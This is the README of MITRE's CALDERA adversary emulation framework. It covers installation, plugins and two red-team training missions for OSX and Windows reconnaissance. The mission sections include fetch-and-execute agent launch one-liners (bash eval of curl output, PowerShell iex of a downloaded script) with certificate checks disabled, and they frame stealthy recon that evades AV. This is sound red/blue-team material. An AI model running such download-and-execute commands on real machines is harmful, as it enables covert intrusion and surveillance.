# CALDERA

CALDERA is an automated adversary emulation system, built on the [MITRE ATT&CK™ framework](https://attack.mitre.org/), 
that performs post-compromise adversarial behavior inside computer networks. It is intended for both red and blue teams.

CALDERA requires Python 3.5.3+ to run and is designed on top of the asyncio library.

![alt text](readme.png)

## Installation

Start by cloning this repository recursively. This will pull all available plugins. 
```
git clone https://github.com/mitre/caldera.git --recursive
```

From the root of this project, install the PIP requirements.
```
pip install -r requirements.txt
```

Then start the server, passing in a reference to an environment configuration file. Config files live inside
the conf/ directory. The default configuration is local.yml (or just "local" from the command line).
```
python server.py -E local
```

Once running, open a terminal into CALDERA and enter help to see the options.
```
nc localhost 8880
monitor >>> help
```
## Versions

Bleeding-edge code can be run by using the latest master branch source code. Stable versions are tagged
by major.minor.bugfix numbers and can be used by cloning the appropriate tagged version:
```
git clone --branch 2.0.0 https://github.com/mitre/caldera.git --recursive
```

Check the GitHub releases for the most stable release versions.

> **IMPORTANT**: The core system relies on plugins (git submodules). If you are unfamiliar with this concept and want to run the bleeding-edge code, a "git pull" on this code will likely not be sufficient. You will also need to update the submodules to ensure all plugins are current. One way to do this is by using an alias, such as:
```alias tig="git reset --hard origin/master && git checkout master && git reset --hard origin/master && git pull && git submodule foreach git checkout master && git submodule foreach git pull"```

> *NOTE*: The functionality and schema used by the first release of CALDERA is now stored within the *ADVERSARY* 
plugin. This plugin is loaded automatically with the rest of the submodules, but will not be loaded in 
CALDERA at runtime unless added to the list of submodules in *conf/local.yml*. More information about the *ADVERSARY*
 plugin can be found at the repository for the [Adversary plugin](https://github.com/mitre/adversary).

## Terminology

CALDERA works by attaching abilities to an adversary and running the adversary in an operation. 

* **Ability**: A specific task or set of commands mapped to ATT&CK Tactics and Techniques, written in any language
* **Adversary**: A threat profile that contains a set of abilities, making it easy to form repeatable operations 
* **Agent**: An individual computer running a CALDERA agent, such as the [54ndc47 plugin](https://github.com/mitre/sandcat)
* **Group**: A collection of agents
* **Operation**: A start-to-finish execution of an adversary profile against a group

CALDERA ships with a few pre-built abilities and adversaries with the [Stockpile plugin](https://github.com/mitre/stockpile), 
but it's easy to add your own. 

## Plugins

CALDERA is built using a plugin architecture on top of the core system (this repository). Plugins are 
software components that plug new features and behavior into the core system. Plugins reside
in the plugins/ directory. For more information on each plugin, refer to their respective README files.

Load plugins into the core system by listing them in the conf/local.yml file, then restart
CALDERA for them to become available.

## Planning

When running an operation, CALDERA hooks in a planning module that determines in which order to run each ability. 
An operation executes abilities within phases, but if there are multiple abilities in a phase, the planning module
determines which to run first. The planning module can be changed in the configuration file, local.yml.

## Getting started

To understand CALDERA, it helps to run an operation. Below are pre-built missions you can follow
along with to understand the system. These missions will assume CALDERA is running locally on a laptop.

### Mission #1: OSX reconnaissance

*This mission requires an OSX laptop.*

> Perform reconnaissance on a compromised OSX laptop. Your employer needs a list of the user’s preferred WIFI networks to perform surveillance on them. Grab this list and collect anything else you can, then get out of town. Quickly. Leave no trace. There is one caveat: the laptop’s AV scans the machine in full every minute. 
You must complete this mission in less than 60 seconds. 

Start by booting up the core system on your OSX laptop.
```
python server.py -E local
```

Then start a 54ndc47 agent on the same machine.
```
eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render?group=client)"
```

Then, in a new terminal window, open a shell to the core system. Type help to see all options. Then,
view the connected agent and the group that was created with the appropriate keystrokes.
```
nc localhost 8880
monitor >>> help
monitor >>> ag
monitor >>> gr
```

Next, look at the loaded adversaries, and dive deeper into the mission1 adversary.
```
monitor >>> ad
monitor >>> ad 1
```

Then queue up a new operation, passing in an operation name (test1), adversary ID (1), group ID (1),
and jitter fraction. The fraction determines how often each agent will check in with CALDERA. The 
fraction below (3/5) means the check-in will happen between every 3 to 5 seconds. Finally, start your operation and 
confirm it is in progress by viewing all operations. The operation will have completed when a finish
timestamp is visible.
```
monitor >>> qu test1 1 1 3/5
monitor >>> st 1
monitor >>> op
``` 

It will take up to 60 seconds for the agent to join the operation, at which point it will check in 
according to the jitter time chosen. Every few seconds, check the progress of the operation.
```
monitor >>> op 1
```

Once the operation is complete, compare the execution time of the first and last commands. Was
the mission a success? Did the mission1 adversary run without a trace? Can you figure out why the 
abilities are being run in the order they are?

*Extra credit: go to https://localhost:8888 in a browser, logging in with the credentials admin:admin, and 
click into the Chain mode plugin. Can you see how you'd manage an operation from the GUI?*

### Mission #2: PowerShell reconnaissance

*This mission requires PowerShell 3.0+ and is compatible with the open-source version.*

> Perform reconnaissance on a compromised Windows laptop. Your employer needs a list of all processes running
 on the machine, so make sure this is fetched first. Then, perform other recon tasks and get out
 before you get caught. 

Perform the same steps as mission #1 - with the exception of:

1. Start a PowerShell version of 54ndc47, instead of a bash version.
```
$url="https://localhost:8888/file/render?group=client"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);}
```

2. Run the mission2 adversary, instead of mission1.

## Developers

Be a ninja committer: changes should aim for the smallest change set possible to achieve the goal. 
Additionally, changes should be consistent with the general format and design of what already exists.

### GIT flow

We use the basic feature branch GIT flow. Create a feature branch off of master and when ready, submit a merge 
request. Make branch names and commits descriptive. A merge request should solve one problem,
not many. 

### Build your own plugin

Creating your own plugin allows you to hook into the core system and manipulate existing functionality or 
or add your own. To do so, create a directory inside the plugins directory that has a hook.py module at the root. 
This module should have an <i>initialize</i> function that accepts two parameters: "app" and "services". 
App is the aiohttp server instance itself. You can attach new REST endpoints and functionality to it.
Services is a dictionary of core services passed to each plugin at server boot time, allowing them
to hook into the core code. 

Inside the hook.py module, a plugin must also define the following:

* Name: the name of the plugin
* Description: a phrase describing its purpose
* Address: the URI of the main GUI page. This can be None.
* Store: the directory containing files the core /file/download endpoint should be aware of. This can be None.

These are the current services each plugin receives via the services dictionary:

#### data_svc

Contains logic for performing all CRUD operations against the core database objects. 
This service can be injected into all other core services at boot time.

#### utility_svc

Contains a handful of utility functions to encourage consistency across plugins.
This service can be injected into all other core services at boot time.

#### auth_svc

Contains the login and create user functionality.

#### operation_svc

Contains logic for running and manipulating operations.

#### logger

A custom logger shared with all plugins. When used, all logs by default will print to the console and
the .logs/ directory. Additionally, they can easily be sent to an ELK stack by enabling that option 
inside the Logger module.

#### plugins

A complete list of the loaded plugin modules. 

## Closed-source

In addition to CALDERA's open source capabilities, MITRE maintains several in-house CALDERA plugins that offer 
more advanced functionality. For more information, or to discuss licensing opportunities, please reach out to 
caldera@mitre.org or directly to MITRE's Technology Transfer Office at 
https://www.mitre.org/about/corporate-overview/contact-us#technologycontact.

## Related MITRE Work

[BRAWL Game](https://github.com/mitre/brawl-public-game-001) - Data set created by the BRAWL project representing
one CALDERA operation with data collected by Microsoft Sysmon and other sensors.

[CASCADE](https://github.com/mitre/cascade-server) - Prototype blue team analysis tool to automate investigative work.

## Acknowledgements

[Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
